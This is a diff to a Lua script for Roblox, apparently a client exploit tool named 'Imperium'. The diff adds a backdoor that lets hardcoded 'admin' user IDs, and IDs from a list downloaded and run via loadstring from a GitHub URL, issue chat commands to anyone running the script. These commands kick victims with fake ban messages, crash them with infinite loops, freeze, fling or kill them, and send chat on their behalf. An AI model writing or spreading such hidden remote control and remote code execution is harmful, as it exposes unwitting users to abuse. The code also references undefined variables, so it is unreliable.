@@ -1,81 +1,39 @@
-local players = game:GetService("Players")
-local plr = players.LocalPlayer
-local OnBenx = false
-local prefix = "!"
-local Flinging = false
+local ImperiumAdmins = {
+    5127756688
+}
 
-local BrokenVip = {}
-local BrokenPremium = {}
-local BrokenStaff = {5127756688}
+local milk = {
+    12480466786
+}
 
-local milk = { 12480466786 }
-local jumpscares = { 10755920324, 1119705746, 12213285275, 12293699441, 10727260846, 12342625873, 8804558033 }
+local jumpscares = {
+    10755920324,
+    1119705746,
+    12213285275,
+    12293699441,
+    10727260846,
+    12342625873,
+    8804558033 
+}
 
 local function GetRoot(player)
     return player.Character and player.Character:FindFirstChild("HumanoidRootPart")
 end
 
-local function GetLT(player)
-    return player.Character and player.Character:FindFirstChild("LowerTorso")
-end
-
 local function GetHum(player)
-    return player.Character and player.Character:FindFirstChild("Humanoid")
-end
-
-local function GetPing()
-    return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) / 1000
-end
-
-local function GetPlayer(UserDisplay)
-    if UserDisplay ~= "" then
-        for _, v in pairs(players:GetPlayers()) do
-            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
-                return v
-            end
-        end
-    end
-    return nil
-end
-
-local function PredictionTP(player, method)
-    local root = GetRoot(player)
-    if root then
-        local pos = root.Position
-        local vel = root.Velocity
-        GetRoot(plr).CFrame = CFrame.new(pos.X + vel.X * (GetPing() * 3.5), pos.Y + vel.Y * (GetPing() * 2), pos.Z + vel.Z * (GetPing() * 3.5))
-        if method == "safe" then
-            task.wait()
-            GetRoot(plr).CFrame = CFrame.new(pos)
-            task.wait()
-            GetRoot(plr).CFrame = CFrame.new(pos.X + vel.X * (GetPing() * 3.5), pos.Y + vel.Y * (GetPing() * 2), pos.Z + vel.Z * (GetPing() * 3.5))
-        end
-    end
-end
-
-local function ToggleFling(bool)
-    task.spawn(function()
-        Flinging = bool
-        while Flinging do
-            local RVelocity = GetRoot(plr).Velocity
-            GetRoot(plr).Velocity = Vector3.new(math.random(-150, 150), 9000, math.random(-150, 150))
-            game.RunService.RenderStepped:wait()
-            GetRoot(plr).Velocity = RVelocity
-            game.RunService.Heartbeat:wait()
-        end
-    end)
+	return player.Character.Humanoid
 end
 
 local function Arg3(command)
-    local x = ""
-    for i = 3, #command do
-        x = x .. " " .. command[i]
-    end
-    return x:sub(2)
-end
-
-local function CheckCMD(arg, command)
-    return string.find(arg, prefix .. command) ~= nil
+	local x = ""
+	for i,v in pairs(command) do
+		pcall(function ()
+			if i>=2 then
+				x = x.." "..command[i+1]
+			end
+		end)
+	end
+	return x
 end
 
 local function GenImage(list)
@@ -96,75 +54,138 @@ local function GenImage(list)
         ScreenGui:Destroy()
     end)
 end
+  
+local bending = false
+local kickmsg = 'PERMA BANNED'
+local function commands(msg,plr)
+      if DisableMod == false or table.find(ImperiumAdmins, plr) then
+          local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+          local Msg = string.lower(msg)
+          local SplitCMD = string.split(Msg, ' ')
+          local Lower = string.lower(player.Name)
+          local Allowed = string.find(Lower, SplitCMD[2])
 
-local function BenxTP(player, offset)
-    local lt = GetLT(player)
-    if lt then
-        GetRoot(plr).CFrame = lt.CFrame * CFrame.new(0, 0, offset) * CFrame.Angles(-1.5, 0, 0)
-        task.wait()
-        GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
-    end
-end
+          if Allowed then
+              if string.find(SplitCMD[1], '!freeze') then
+                  player.Character.HumanoidRootPart.Anchored = true
+              end
 
-local function ExecuteCommand(Pid, msg)
-    local Speaker = players:GetPlayerByUserId(Pid)
-    if not Speaker then return end
-    local LowerCMD = msg:lower()
-    local Split = string.split(LowerCMD, " ")
-    local LowerName, LowerDisplay = string.lower(plr.Name), string.lower(plr.DisplayName)
-    local ClientIsVip = table.find(BrokenVip, plr.UserId)
-    local ClientIsPremium = table.find(BrokenPremium, plr.UserId)
-    local SpeakerIsPremium = table.find(BrokenPremium, Speaker.UserId)
-    local SpeakerIsOwner = table.find(BrokenStaff, Speaker.UserId)
+              if string.find(SplitCMD[1], '!thaw') then
+                  player.Character.HumanoidRootPart.Anchored = false
+              end
 
-    local function CanExecute()
-        return (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner))
-    end
+              if string.find(SplitCMD[1], '!kick') then
+                  local ISADMIN = table.find(ImperiumAdmins, player.UserId)
+                  if not ISADMIN then
+                      kickmsg = Mod.Name
+                      player:Kick(kickmsg)
+                      wait(5)
+                      while true do end
+                  end
+              end
 
-    pcall(function()
-        local Allowed = string.find(LowerDisplay, Split[2]) or string.find(LowerName, Split[2])
-        if Allowed then
-
-            if CheckCMD(Split[1], "bring") and CanExecute() then
-                if (not ClientIsPremium) or (SpeakerIsOwner) then
-                GetRoot(plr).CFrame = GetRoot(Speaker).CFrame
-                end
-                
-            elseif CheckCMD(Split[1], "c") and CanExecute() then
-                if (not ClientIsPremium) or (SpeakerIsOwner) then
-                local args = { [1] = ("/w " .. Speaker.Name .. " Hey, I'm using Imperium."), [2] = "All" }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-                args = { [1] = ("/leave"), [2] = "To " .. Speaker.Name }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-                task.wait(GetPing() + 0.1)
-                for _, dm in pairs(plr.PlayerGui.Chat.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller:GetChildren()) do
-                    if dm:IsA("Frame") and dm:FindFirstChildOfClass("TextLabel") then
-                        if string.find(dm:FindFirstChildOfClass("TextLabel").Text, "System") or string.find(dm:FindFirstChildOfClass("TextLabel").Text, "channel") then
-                            dm.Visible = false
-                        end
-                    end
-                end
-                for _, bubble in pairs(game.CoreGui.BubbleChat:GetDescendants()) do
-                    if bubble:IsA("TextLabel") and string.find(bubble.Text, "System") then
-                        bubble.Parent.Parent.Visible = false
-                    end
+              if string.find(SplitCMD[1], '!crash') then
+                local ISADMIN = table.find(ImperiumAdmins, player.UserId)
+                if not ISADMIN then
+                    pcall(function()
+                        while true do end
+                    end)
                 end
             end
 
-            elseif CheckCMD(Split[1], "fling") and CanExecute() then
-                if (not ClientIsPremium) or (SpeakerIsOwner) then
-                GetRoot(plr).CFrame = CFrame.new(9999999999, 9999999999, 9999999999)
-                end
+              if string.find(SplitCMD[1], '!bring') then
+                  player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
+              end
 
-            elseif CheckCMD(Split[1], "freeze") and CanExecute() then
-                if (not ClientIsPremium) or (SpeakerIsOwner) then
-                for _, v in pairs(plr.Character:GetChildren()) do
-                    if v:IsA("BasePart") then
-                        v.Anchored = true
-                    end
+              if string.find(SplitCMD[1], '!fakeban') then
+                  if table.find(ImperiumAdmins, plr) then
+                      local ISADMIN = table.find(ImperiumAdmins, player.UserId)
+                      if not ISADMIN then
+                          player:Kick('You have been banned for exploiting.')
+                      end
+                  end
+              end
+
+              if string.find(SplitCMD[1], '!fling') then
+                GetRoot(plr).CFrame = CFrame.new(9999999999,9999999999,9999999999)
+              end
+
+              if string.find(SplitCMD[1], '!milk') then
+                GenImage(milk)
+            end
+
+            if string.find(SplitCMD[1], '!jumpscare') then
+                GenImage(jumpscares)
+            end
+
+            if string.find(SplitCMD[1], '!say') then
+                local Message = Arg3(Split)
+                local args = { [1] = Message, [2] = "All" }
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            end
+
+            if string.find(SplitCMD[1], '!blind') then
+                if game:GetService("Lighting"):FindFirstChild("Blur") then
+                    game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
+                end
+                local Blur = Instance.new("BlurEffect")
+                Blur.Size = 30
+                Blur.Enabled = true
+                Blur.Parent = game:GetService("Lighting")
+            end
+
+            if string.find(SplitCMD[1], '!unblind') then
+                if game:GetService("Lighting"):FindFirstChild("Blur") then
+                    game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
                 end
             end
 
+            if string.find(SplitCMD[1], '!kill') then
+                GetHum(plr):ChangeState(15)
+            end
+
+          else
+
+              if string.find(msg, '/e test') then
+                  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey! I'm using Imperium!", 'All');
+              end
+
+          end
+      end
+  end
+  
+  muted = {}
+  
+  local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/swagmode/swagmode/main/modlist'))()
+  Players.PlayerAdded:Connect(function(plr)
+      local SWAGMIN = table.find(ImperiumAdmins, plr.UserId)
+      if SWAGMIN or ModCheck[plr.UserId] then
+          plr.Chatted:Connect(function(msg)
+              commands(msg, plr.UserId)
+          end)
+      end
+      if muteingnew == true then
+          if not table.find(muted, plr.Name) then
+              table.insert(muted, plr.Name)
+              print('automuted ' .. plr.Name)
+          end
+      end
+  end)
+  
+  for i,v in pairs(game:GetService('Players'):GetChildren()) do
+      local SWAGMIN = table.find(ImperiumAdmins, v.UserId)
+      if SWAGMIN or ModCheck[v.UserId] then
+          print('found')
+          v.Chatted:Connect(function(msg)
+             commands(msg, v.UserId)
+          end)
+      end
+  end
+
+
+
+
+--[[
             elseif CheckCMD(Split[1], "jumpscare") and CanExecute() then
                 if (not ClientIsPremium) or (SpeakerIsOwner) then
                 GenImage(jumpscares)
